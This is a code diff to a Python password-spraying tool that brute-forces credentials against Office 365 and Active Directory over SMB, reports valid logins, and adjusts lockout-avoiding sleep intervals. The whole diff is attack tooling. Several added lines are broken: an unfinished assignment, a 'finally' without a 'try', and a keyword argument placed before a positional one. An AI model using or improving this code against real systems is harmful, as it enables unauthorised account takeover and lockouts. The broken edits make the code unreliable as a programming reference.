@@ -179,15 +179,7 @@ def hybrid_office_worker(policy, user, _pass):
         try:
             for username in user.readlines():
                 check_user = check_o365(username)
-                # This is where we will apply our password policy
                 brute_office(username.strip("\n"), _pass, check_user)
-                if attempts == max_attempts:
-                    print()
-                    print(Fore.Blue+"[*]Sleeping, Next spray in: {} seconds".format(timelimit))
-                    print()
-                    sleep(timelimit)
-                    attempts = 0
-                attempts = attempts + 1
         except Exception as e:
             print(e)
             
@@ -225,67 +217,75 @@ def hybrid_office_worker(policy, user, _pass):
 
 def sprayAD(host,username,password,client,computerName,domain_name=""):
     if verbose:
-        print(Fore.YELLOW +
-              "Checking credentials {0}:{1}".format(username, password))
+        print(Fore.YELLOW + "Checking credentials {0}:{1}".format(username, password))
     IP, port = host.split(":")
     if not computerName:
         computerName = getServerName(IP)
 
     conn = SMBConnection(username,password,client,computerName,domain=domain_name,use_ntlm_v2 = True,is_direct_tcp=True)
     if conn.connect(IP,int(port)):
-        print(Fore.GREEN+"VALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
+        print("["+Fore.GREEN+"VALID_CREDS","] {}:{} using {}:{}".format(IP,port,username,password))
     else:
-        print(Fore.RED+"INVALID LOGIN on {}:{} using {}:{}".format(IP,port,username,password))
+        print("["+Fore.RED+"INVALID_CREDENTIALS","] {}:{} using {}:{}".format(IP,port,username,password))
+    finally:
+        conn.close()
     
 
 def hybrid_smb_worker(host, policy, user, _pass, client, computerName="", domain=""):
     #Run hybrid bruteforcing here
     attempts = 1
-    
     max_attempts, timelimit = tuple(policy.split(','))
-    timelimit = 60*int(timelimit)
-    max_attempts = int(max_attempts) - 1
+    timelimit = int(timelimit)
+    max_attempts = int(max_attempts)
 
     if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
         # this shows we are spraying a single username against a passfile
         try:
             for password in _pass.readlines():
-                if attempts == max_attempts:
-                    sleep(timelimit)
-                    attempts = 1
                 sprayAD(host,user, password.strip("\n"), client, computerName, domain_name=domain)
+                if attempts == max_attempts:
+                    print()
+                    print(Fore.BLUE+"[*]Sleeping, Next spray in: {} seconds".format(timelimit))
+                    print()
+                    sleep(timelimit)
+                    attempts = 0
                 attempts = attempts + 1
-                sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+        except KeyboardInterrupt:
+            print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+            sys.exit(0)
 
     elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
         # this shows we are spraying a single password against a userfile
         try:
             for username in user.readlines():
-                if attempts == max_attempts:
-                    sleep(timelimit)
-                    attempts = 1
                 sprayAD(host, username.strip("\n"), _pass, client, computerName, domain_name=domain)
-                attempts = attempts + 1
-                sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
+        except KeyboardInterrupt:
+            print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+            sys.exit(0)
 
     elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
         # this means we are spraying userfile against passfile.
         try:
+            passfile = 
             for password in _pass.readlines():
                 for username in user.readlines():
-                    if attempts == max_attempts:
-                        sleep(timelimit)
-                        attempts = 1
                     sprayAD(host, username.strip("\n"), password.strip("\n"), client, computerName, domain_name=domain)
-                    attempts = attempts + 1
-                    sleep(timelimit//max_attempts)
+                    if attempts == max_attempts:
+                        print()
+                        print(Fore.BLUE+"[*]Sleeping, Next spray in: {} seconds".format(timelimit))
+                        print()
+                        sleep(timelimit)
+                        attempts = 0
+                attempts = attempts + 1
         except Exception as e:
             print(e)
-            exit(0)
+        except KeyboardInterrupt:
+            print(Fore.RED+"[!] Detected Ctrl + C. Shutting down...")
+            sys.exit(0)
 
     else:
         print(Fore.RED +"[!]Unknown input. Check the usage")
@@ -340,14 +340,15 @@ if __name__ == '__main__':
             brute_office(username, password,check_user)
         else:
             if not policy:
-                ArgumentParser().print_help()
-                sys.exit(0)
+                if userfile and password:
+                    userfile = open(userfile, 'r')
+                    hybrid_office_worker(policy="", userfile, password)
+                else:
+                    ArgumentParser().print_help()
+                    sys.exit(0)
             if username and passfile:
                 passfile = open(passfile, 'r')
                 hybrid_office_worker(policy, username, passfile)
-            elif userfile and password:
-                userfile = open(userfile, 'r')
-                hybrid_office_worker(policy, userfile, password)
             elif userfile and passfile:
                 passfile = open(passfile, 'r')
                 userfile = open(userfile, 'r')
@@ -389,4 +390,4 @@ if __name__ == '__main__':
                 print(Fore.RED+"[+]Unknown error! Check usage")
                 ArgumentParser().print_help()
                 sys.exit(0)
-                
+    print(Fore.GREEN+"[*] All Jobs Done! Nothing to Spray/Bruteforce")  
